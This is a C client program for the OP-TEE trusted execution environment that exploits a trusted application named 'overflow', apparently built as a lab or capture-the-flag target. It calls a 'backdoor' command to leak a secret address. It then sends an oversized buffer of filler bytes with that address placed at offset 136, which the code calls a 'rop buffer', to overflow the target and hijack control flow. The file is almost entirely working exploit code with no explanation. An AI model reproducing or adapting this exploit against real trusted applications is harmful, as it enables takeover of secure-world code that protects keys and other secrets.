#include <err.h>
#include <stdio.h>
#include <string.h>

/* OP-TEE TEE client API (built by optee_client) */
#include <tee_client_api.h>
/* To the the UUID (found the the TA's h-file(s)) */
#include <overflow.h>

static inline void reg_pair_from_64(uint64_t val, uint32_t *reg0,
            uint32_t *reg1)
{
    *reg0 = val >> 32;
    *reg1 = val;
}

int main(void)
{
	TEEC_Result res;
    TEEC_Context ctx;
    TEEC_Session sess;
    TEEC_Operation op;
    TEEC_UUID uuid = TA_OVERFLOW_UUID;
    uint64_t backdoor;
    uint32_t err_origin;

    res = TEEC_InitializeContext(NULL, &ctx);
    // printf("%s %d\n", __FILE__, __LINE__);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_InitializeContext failed with code 0x%x", res);
    
    res = TEEC_OpenSession(&ctx, &sess, &uuid,
                   TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
    printf("%s %d\n", __FILE__, __LINE__);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
            res, err_origin);

    memset(&op, 0, sizeof(op));


    {
        op.params[0].value.a = 0;
        op.paramTypes = TEEC_PARAM_TYPES
            (
                TEEC_VALUE_INOUT,
                TEEC_NONE,
                TEEC_NONE,
                TEEC_NONE
            );
        printf("Invoking TA for %s, %s\n", "backdoor","leak secret address");
        res = TEEC_InvokeCommand(&sess, TA_BACKDOOR_CMD, &op, &err_origin);
        backdoor = op.params[0].value.a;
        printf("Backdoor address is at: %p\n", op.params[0].value.a);
    }

    {
        char buffer_a[] = "qsdfuaislfbasilfbasdilbfisasdfiusaifbsaifbsufbiasufbiasdasidfbisadubfiasbfisubfiusdasidfbasidbfiasdufbsaidfbaisbfiasbfiasbfiabfiudsbxzcvhububwainfoqwniqwbiqwbifjscsbvifdnwvinefmvoimwiv";
        char  buffer_b[400];
        memcpy(&buffer_b[0], buffer_a,184);
        memcpy(&buffer_b[136], &backdoor,8);
        op.paramTypes = TEEC_PARAM_TYPES
            (
                TEEC_MEMREF_TEMP_INOUT,
                TEEC_VALUE_INOUT,
                TEEC_MEMREF_TEMP_INPUT,
                TEEC_VALUE_INPUT
            );
        
        op.params[0].tmpref.buffer = ((char*)buffer_a);
        op.params[0].tmpref.size = sizeof(buffer_a);
        reg_pair_from_64(0,&op.params[1].value.a,&op.params[1].value.b);
        op.params[2].tmpref.buffer = ((char*)buffer_b);
        op.params[2].tmpref.size = sizeof(buffer_b);
        reg_pair_from_64(2,&op.params[3].value.a,&op.params[3].value.b);
        
        printf("Invoking TA for %s, %s\n", "empty buffer","rop buffer");
        res = TEEC_InvokeCommand(&sess, TA_OVERFLOW_CMD, &op, &err_origin);
        // if(res != TEE_SUCCESS) goto fin;
    }

    TEEC_CloseSession(&sess);

    TEEC_FinalizeContext(&ctx);
	return 0;
}
